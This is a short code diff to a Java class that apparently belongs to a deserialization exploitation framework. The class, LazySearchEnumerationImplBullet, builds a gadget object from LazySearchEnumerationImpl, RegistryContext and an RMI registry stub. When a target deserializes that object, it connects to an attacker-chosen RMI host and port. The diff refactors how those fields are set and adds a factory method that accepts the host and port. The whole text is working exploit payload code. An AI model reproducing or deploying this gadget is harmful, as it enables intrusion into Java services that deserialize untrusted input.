@@ -32,8 +32,8 @@ public class LazySearchEnumerationImplBullet implements Bullet<LazySearchEnumera
     public LazySearchEnumerationImpl getObject() throws Exception {
         RegistryContext ctx = ReflectionHelper.createWithoutConstructor(RegistryContext.class);
         Bullet bullet = new RMIConnectBullet();
-        bullet.set("rhost", rhost);
-        bullet.set("rport", rport);
+        ReflectionHelper.set(bullet, "rhost", rhost);
+        ReflectionHelper.set(bullet, "rport", rport);
         RegistryImpl_Stub stub = new RegistryImpl_Stub((UnicastRef)bullet.getObject());
         ReflectionHelper.setFieldValue(ctx, "host", rhost);
         ReflectionHelper.setFieldValue(ctx, "port", Integer.parseInt(rport));
@@ -44,5 +44,12 @@ public class LazySearchEnumerationImplBullet implements Bullet<LazySearchEnumera
         LazySearchEnumerationImpl enumeration = ReflectionHelper.createWithoutConstructor(LazySearchEnumerationImpl.class);
         ReflectionHelper.setFieldValue(enumeration, "candidates", naming);
         return enumeration;
+    }
+
+    public static Bullet newInstance(Object... args) throws Exception {
+        LazySearchEnumerationImplBullet bullet = new LazySearchEnumerationImplBullet();
+        ReflectionHelper.set(bullet, "rhost", args[0]);
+        ReflectionHelper.set(bullet, "rport", args[1]);
+        return bullet;
     }
 }
